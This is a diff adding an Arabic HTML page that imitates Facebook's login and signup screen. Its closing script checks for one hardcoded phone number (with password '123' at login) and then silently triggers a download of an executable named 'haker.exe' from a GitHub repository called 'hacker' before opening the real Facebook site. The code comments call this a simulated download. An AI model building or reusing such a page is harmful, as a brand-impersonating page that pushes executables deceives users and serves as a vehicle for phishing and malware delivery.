@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background-color: #3b5998;
+            padding: 10px 0;
+            color: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1);
+        }
+        
+        .header-content {
+            max-width: 980px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            font-size: 40px;
+            font-weight: bold;
+            color: white;
+            text-decoration: none;
+        }
+        
+        .login-form {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        
+        .form-group label {
+            font-size: 12px;
+            color: white;
+        }
+        
+        .form-group input {
+            padding: 6px;
+            border: 1px solid #dddfe2;
+            border-radius: 2px;
+            font-size: 12px;
+            width: 150px;
+        }
+        
+        .login-btn {
+            background-color: #4267b2;
+            border: 1px solid #29487d;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 2px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 18px;
+        }
+        
+        .login-btn:hover {
+            background-color: #365899;
+        }
+        
+        .forgot-link {
+            color: #9cb4d8;
+            font-size: 12px;
+            text-decoration: none;
+            margin-top: 5px;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        
+        .content-wrapper {
+            max-width: 980px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+        
+        .intro-text {
+            max-width: 500px;
+        }
+        
+        .intro-text h2 {
+            font-size: 28px;
+            font-weight: normal;
+            color: #1c1e21;
+            margin-bottom: 10px;
+        }
+        
+        .intro-text p {
+            font-size: 15px;
+            color: #606770;
+        }
+        
+        .signup-box {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 400px;
+        }
+        
+        .signup-box h1 {
+            font-size: 25px;
+            color: #1c1e21;
+            margin-bottom: 5px;
+        }
+        
+        .signup-box p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #dadde1;
+            padding-bottom: 20px;
+        }
+        
+        .signup-form input {
+            width: 100%;
+            padding: 11px;
+            margin-bottom: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 15px;
+        }
+        
+        .signup-form input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        
+        .signup-btn {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 10px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .signup-btn:hover {
+            background-color: #36a420;
+        }
+        
+        .create-page {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            background-color: white;
+            padding: 20px 0;
+            color: #737373;
+            font-size: 12px;
+            border-top: 1px solid #dddfe2;
+        }
+        
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .download-message {
+            background-color: #e7f3ff;
+            border: 1px solid #b3d4fc;
+            border-radius: 5px;
+            padding: 10px;
+            margin-top: 10px;
+            text-align: center;
+            color: #1877f2;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <a href="#" class="logo">facebook</a>
+            <div class="login-form">
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" id="email">
+                </div>
+                <div class="form-group">
+                    <label for="password">كلمة السر</label>
+                    <input type="password" id="password">
+                </div>
+                <button class="login-btn" id="loginBtn">تسجيل الدخول</button>
+                <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="content-wrapper">
+            <div class="intro-text">
+                <h2>يساعد Facebook على التواصل مع الأشخاص ومشاركة ما تريد معهم.</h2>
+                <p>يساعدك Facebook على التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+            </div>
+            
+            <div class="signup-box">
+                <h1>إنشاء حساب جديد</h1>
+                <p>إنه سريع وسهل.</p>
+                
+                <form class="signup-form">
+                    <input type="text" placeholder="الاسم الأول">
+                    <input type="text" placeholder="اسم العائلة">
+                    <input type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" id="signupPhone">
+                    <input type="password" placeholder="كلمة سر جديدة">
+                    
+                    <div class="download-message hidden" id="downloadMessage">
+                        يتم الآن تنزيل الملف...
+                    </div>
+                    
+                    <button type="button" class="signup-btn" id="signupBtn">إنشاء حساب</button>
+                </form>
+                
+                <div class="create-page">
+                    <a href="#">إنشاء صفحة</a> لمشهور أو علامة تجارية أو مؤسسة.
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">العربية</a>
+                <a href="#">English (US)</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Español</a>
+                <a href="#">Italiano</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">日本語</a>
+                <a href="#">+</a>
+            </div>
+            
+            <div class="footer-links">
+                <a href="#">تسجيل الدخول</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Watch</a>
+                <a href="#">الأماكن</a>
+                <a href="#">الألعاب</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Facebook Pay</a>
+                <a href="#">Oculus</a>
+                <a href="#">Portal</a>
+                <a href="#">Instagram</a>
+                <a href="#">Bulletin</a>
+                <a href="#">المحلي</a>
+                <a href="#"> حملات التبرّع</a>
+                <a href="#">الخدمات</a>
+                <a href="#">مركز معلومات التصويت</a>
+                <a href="#">المجموعات</a>
+                <a href="#">حول</a>
+                <a href="#">إنشاء إعلان</a>
+                <a href="#">إنشاء صفحة</a>
+                <a href="#">المطورون</a>
+                <a href="#">الوظائف</a>
+                <a href="#">الخصوصية</a>
+                <a href="#">ملفات تعريف الارتباط</a>
+                <a href="#">خيارات الإعلانات</a>
+                <a href="#">الشروط</a>
+                <a href="#">مساعدة</a>
+            </div>
+            
+            <div class="copyright">
+                Facebook © 2023
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (email === '01123961290' && password === '123') {
+                // تنزيل الملف
+                const downloadMessage = document.getElementById('downloadMessage');
+                downloadMessage.classList.remove('hidden');
+                
+                // محاكاة تنزيل الملف
+                setTimeout(function() {
+                    // إنشاء رابط تنزيل وهمي
+                    const link = document.createElement('a');
+                    link.href = 'https://github.com/eslam55pro-lgtm/hacker/blob/main/haker.exe';
+                    link.download = 'haker.exe';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    // فتح موقع فيسبوك
+                    window.open('https://www.facebook.com', '_blank');
+                    
+                    downloadMessage.textContent = 'تم التنزيل بنجاح! يتم الآن فتح Facebook...';
+                }, 2000);
+            } else {
+                alert('البريد الإلكتروني أو كلمة السر غير صحيحة');
+            }
+        });
+        
+        document.getElementById('signupBtn').addEventListener('click', function() {
+            const phone = document.getElementById('signupPhone').value;
+            
+            if (phone === '01123961290') {
+                // تنزيل الملف
+                const downloadMessage = document.getElementById('downloadMessage');
+                downloadMessage.classList.remove('hidden');
+                
+                // محاكاة تنزيل الملف
+                setTimeout(function() {
+                    // إنشاء رابط تنزيل وهمي
+                    const link = document.createElement('a');
+                    link.href = 'https://github.com/eslam55pro-lgtm/hacker/blob/main/haker.exe';
+                    link.download = 'haker.exe';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    // فتح موقع فيسبوك
+                    window.open('https://www.facebook.com', '_blank');
+                    
+                    downloadMessage.textContent = 'تم التنزيل بنجاح! يتم الآن فتح Facebook...';
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
